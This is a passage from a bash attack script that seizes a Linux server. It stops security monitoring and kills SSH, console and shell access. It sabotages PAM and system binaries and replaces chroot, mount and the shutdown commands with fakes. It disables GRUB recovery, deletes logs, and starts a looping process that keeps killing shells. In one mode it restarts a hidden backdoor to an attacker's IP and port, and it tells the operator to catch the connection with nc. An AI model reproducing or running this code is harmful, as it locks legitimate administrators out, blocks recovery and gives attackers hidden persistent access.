    if [ -f "/etc/systemd/system/${service}.service" ] || [ -f "/usr/lib/systemd/system/${service}.service" ] || [ -f "/lib/systemd/system/${service}.service" ] || [ -f "/etc/init.d/${service}" ]; then
        service_command stop $service
        service_command disable $service
        echo -e "${GREEN}$service stopped [DONE]${NC}"
    fi
done

# 5. File system protection
echo -e "${GREEN}Enabling file system protection...${NC}"
if command_exists chattr; then
    for file in /etc/passwd /etc/shadow /etc/group /etc/sudoers /etc/ssh/sshd_config; do
        if [ -f "$file" ]; then
            chattr +i "$file" 2>/dev/null &
            show_progress $! "Protecting $file"
        fi
    done
    
    for file in /var/www/html/index.* /usr/share/nginx/html/index.* /srv/www/html/index.*; do
        if [ -f "$file" ]; then
            chattr +i "$file" 2>/dev/null &
            show_progress $! "Protecting web content"
        fi
    done
fi

# 6. Network configuration
setup_firewall

# Block cloud metadata
if command_exists ip; then
    ip route add blackhole 169.254.169.254 2>/dev/null
fi

# 7. Apply mode-specific restrictions
apply_kernel_restrictions
apply_resource_restrictions
isolate_users
destroy_terminals
sabotage_system_binaries
destroy_pam
restrict_filesystem

# 8. Neutralize recovery tools
echo -e "${GREEN}Neutralizing recovery tools...${NC}"
if command_exists chroot && [ -x /usr/sbin/chroot ]; then
    mv /usr/sbin/chroot /usr/sbin/chroot.real 2>/dev/null
    echo -e '#!/bin/sh\necho "Operation not permitted"\nexit 1' > /usr/sbin/chroot
    chmod +x /usr/sbin/chroot 2>/dev/null
fi

if command_exists mount && [ -x /bin/mount ]; then
    mv /bin/mount /bin/mount.real 2>/dev/null
    cat > /bin/mount << 'MOUNT_WRAPPER'
#!/bin/sh
if echo "$*" | grep -q "remount" && echo "$*" | grep -q "rw"; then
    echo "Operation not permitted"
    exit 1
fi
exec /bin/mount.real "$@"
MOUNT_WRAPPER
    chmod +x /bin/mount 2>/dev/null
fi

# 9. Block console access
echo -e "${GREEN}Blocking console access...${NC}"
for tty in 1 2 3 4 5 6; do
    service_command stop "getty@tty${tty}"
    service_command disable "getty@tty${tty}"
done

pkill -9 agetty 2>/dev/null
pkill -9 login 2>/dev/null

for service in gdm3 lightdm sddm; do
    service_command stop $service
    service_command disable $service
done

pkill -9 Xorg 2>/dev/null

# 10. Protect critical services
echo -e "${GREEN}Protecting critical services...${NC}"
if [ -f /etc/default/grub ] && [ -w /etc/default/grub ]; then
    sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT=.*/GRUB_CMDLINE_LINUX_DEFAULT=""/' /etc/default/grub 2>/dev/null
    echo 'GRUB_DISABLE_RECOVERY=true' >> /etc/default/grub 2>/dev/null
    
    if command_exists update-grub; then
        update-grub 2>/dev/null &
        show_progress $! "Updating GRUB"
    elif command_exists grub2-mkconfig; then
        grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null &
        show_progress $! "Updating GRUB2"
    fi
fi

# 11. Enhanced web service protection
protect_web_services

# 12. Process cleanup
echo -e "${GREEN}Cleaning up processes...${NC}"
pkill -9 telnetd 2>/dev/null
pkill -9 ftpd 2>/dev/null

# Kill all user shells (except web and watchdog)
if [ $BACKDOOR_MODE -eq 0 ]; then
    CURRENT_PID=$$
    for pid in $(pgrep -f "bash|sh|zsh|dash" 2>/dev/null); do
        # Don't kill this script or web/watchdog processes
        if [ "$pid" -ne "$CURRENT_PID" ]; then
            if ! ps -p "$pid" -o cmd= 2>/dev/null | grep -E "apache2|nginx|httpd|watchdog|rootengine" > /dev/null; then
                kill -9 "$pid" 2>/dev/null
            fi
        fi
    done
fi

# 13. Display control
echo -e "${GREEN}Controlling display...${NC}"
clear
printf '\033[2J\033[3J\033[1;1H'

# Disable backlight
for brightness in /sys/class/backlight/*/brightness; do
    if [ -f "$brightness" ] && [ -w "$brightness" ]; then
        echo 0 > "$brightness"
    fi
done

# Blank TTYs
for tty in 1 2 3 4 5 6; do
    if [ -c "/dev/tty$tty" ]; then
        echo -ne "\033[2J\033[3J\033[H" > "/dev/tty$tty"
    fi
done

# 14. Stop databases
echo -e "${GREEN}Stopping database services...${NC}"
for service in mysql mariadb mysqld postgresql postgresql-13 postgresql-14 postgresql-15; do
    service_command stop $service 2>/dev/null
    service_command disable $service 2>/dev/null
done

# 15. Final SSH termination
echo -e "${GREEN}Terminating SSH...${NC}"
pkill -9 sshd 2>/dev/null &
show_progress $! "Killing SSH processes"

# 16. Disable shutdown commands
echo -e "${GREEN}Disabling shutdown commands...${NC}"
for cmd in reboot shutdown poweroff halt init telinit; do
    for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd; do
        if [ -x "$path" ]; then
            mv "$path" "${path}.disabled" 2>/dev/null
        fi
    done
    
    cat > /usr/local/bin/$cmd << 'FAKE_CMD'
#!/bin/sh
echo "Command disabled"
exit 1
FAKE_CMD
    chmod +x /usr/local/bin/$cmd 2>/dev/null
done

# 17. Create persistence killer (Mode 1 only)
if [ $BACKDOOR_MODE -eq 0 ]; then
    cat > /tmp/persistence_killer.sh << 'KILLER_SCRIPT'
#!/bin/sh
while true; do
    # Kill any new shell sessions
    KILLER_PID=$$
    for pid in $(pgrep -f "bash|sh|zsh|dash" 2>/dev/null); do
        # Don't kill this persistence killer script
        if [ "$pid" -ne "$KILLER_PID" ]; then
            if ! ps -p "$pid" -o cmd= 2>/dev/null | grep -E "apache2|nginx|httpd|watchdog|persistence" > /dev/null; then
                kill -9 "$pid" 2>/dev/null
            fi
        fi
    done
    
    # Kill any SSH that might restart
    pkill -9 sshd 2>/dev/null
    
    # Ensure TTYs stay disabled
    for tty in /dev/tty*; do
        if [ -c "$tty" ]; then
            chmod 000 "$tty" 2>/dev/null
        fi
    done
    
    sleep 5
done
KILLER_SCRIPT
    
    chmod +x /tmp/persistence_killer.sh
    nohup /tmp/persistence_killer.sh >/dev/null 2>&1 &
fi

# 18. Final checks
echo ""
echo -e "${GREEN}Performing final checks...${NC}"
echo ""

# Check web services
web_running=false
for service in apache2 httpd nginx; do
    if ps aux 2>/dev/null | grep -v grep | grep -q "$service"; then
        echo -e "${GREEN}[OK] $service is running${NC}"
        web_running=true
    fi
done

if ! $web_running; then
    echo -e "${RED}[WARNING] No web server detected${NC}"
fi

# Check ports
if [ -f /proc/net/tcp ]; then
    if grep -q "0050\|01BB" /proc/net/tcp 2>/dev/null; then
        echo -e "${GREEN}[OK] Web ports are open (80/443)${NC}"
    else
        echo -e "${RED}[WARNING] Web ports not accessible${NC}"
    fi
fi

# Check console
if ! ps aux 2>/dev/null | grep -E "getty|agetty" | grep -v grep >/dev/null; then
    echo -e "${GREEN}[OK] Console access blocked${NC}"
else
    echo -e "${RED}[WARNING] Console still accessible${NC}"
fi

# Check security tools
security_running=false
for proc in snort suricata splunk elastic; do
    if pgrep -f "$proc" >/dev/null 2>&1; then
        security_running=true
        echo -e "${RED}[WARNING] Security tool still running: $proc${NC}"
    fi
done

if ! $security_running; then
    echo -e "${GREEN}[OK] All security monitoring disabled${NC}"
fi

# Check backdoor (Mode 2)
if [ $BACKDOOR_MODE -eq 1 ]; then
    backdoor_running=false
    for dir in "${HIDDEN_DIRS[@]}"; do
        if [ -f "$dir/update.sh" ]; then
            if ps aux 2>/dev/null | grep -v grep | grep -q "$dir/update.sh"; then
                backdoor_running=true
                break
            fi
        fi
    done
    
    if $backdoor_running; then
        echo -e "${GREEN}[OK] Backdoor is active${NC}"
    else
        echo -e "${RED}[WARNING] Backdoor not running${NC}"
    fi
fi

# Summary
echo ""
echo -e "${GREEN}System lockdown complete${NC}"
echo ""

if [ $BACKDOOR_MODE -eq 0 ]; then
    echo -e "${YELLOW}Mode: Aggressive (Maximum Lockdown)${NC}"
    echo ""
    echo -e "Active Services:"
    echo -e "  - Web services: Running"
    echo ""
    echo -e "Disabled/Blocked:"
    echo -e "  - All IDS/IPS/SIEM tools"
    echo -e "  - Administrative access"
    echo -e "  - Console & TTY access"
    echo -e "  - SSH connections"
    echo -e "  - System shells"
    echo -e "  - Recovery tools"
    echo -e "  - All system logs (encrypted/deleted)"
else
    echo -e "${YELLOW}Mode: Backdoor (Attacker Access)${NC}"
    echo ""
    echo -e "Active Services:"
    echo -e "  - Web services: Running"
    echo -e "  - Backdoor: $BACKDOOR_IP:$BACKDOOR_PORT"
    echo ""
    echo -e "Disabled/Blocked:"
    echo -e "  - All IDS/IPS/SIEM tools"
    echo -e "  - Administrative access (legitimate users)"
    echo -e "  - Console access"
    echo -e "  - SSH service"
    echo -e "  - All system logs (encrypted/deleted)"
    echo ""
    echo -e "Connect with: ${CYAN}nc -lvnp $BACKDOOR_PORT${NC}"
fi

echo ""

# Redirect output and keep running
if [ $BACKDOOR_MODE -eq 0 ]; then
    # Mode 1: Completely silent
    exec 1>/dev/null 2>&1
    
    while true; do
        sleep 3600
    done
else
    # Mode 2: Keep some logging for attacker
    exec 1>/tmp/.system.log 2>&1
    
    echo "[$(date)] System lockdown complete - Backdoor mode active"
    echo "[$(date)] Backdoor: $BACKDOOR_IP:$BACKDOOR_PORT"
    echo "[$(date)] All security monitoring neutralized"
    echo "[$(date)] System in monitoring mode"
    
    while true; do
        # Log backdoor status
        if ps aux 2>/dev/null | grep -v grep | grep -q "update.sh"; then
            echo "[$(date)] Backdoor status: Active" >> /tmp/.system.log 2>&1
        else
            echo "[$(date)] Backdoor status: Inactive - Attempting restart" >> /tmp/.system.log 2>&1
            for dir in "${HIDDEN_DIRS[@]}"; do
                if [ -f "$dir/update.sh" ]; then
                    nohup "$dir/update.sh" >/dev/null 2>&1 &
                fi
            done
        fi
        
        sleep 300
    done
fi
